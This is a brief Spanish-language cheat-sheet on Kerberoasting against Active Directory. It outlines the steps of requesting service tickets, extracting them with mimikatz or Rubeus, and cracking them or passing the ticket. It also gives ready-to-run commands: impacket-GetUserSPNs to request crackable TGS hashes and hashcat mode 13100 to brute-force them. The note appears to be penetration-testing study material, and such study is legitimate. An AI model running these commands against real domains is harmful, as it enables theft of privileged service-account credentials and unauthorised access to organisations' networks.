# Kerberoasting

- Este ataque sirve para obtener credenciales de cuentas de servicios que están configurados con la autenticación Kerberos.
- En AD comunmente las cuentas de servicios tienen privilegios muy elevados.

## Como funciona

1. Solicitud TGS
2. Obtener Ticket.
3. Extraerlo con mimikatz o rubeus
4. Fuerza bruta o pass the ticket

- `sudo impacket-GetUserSPNs DOMAIN.LOCAL/USER:password -dc-ip IP -request`
- Guardar hash
- `hashcat -m 13100 hash.txt wordlist.txt`
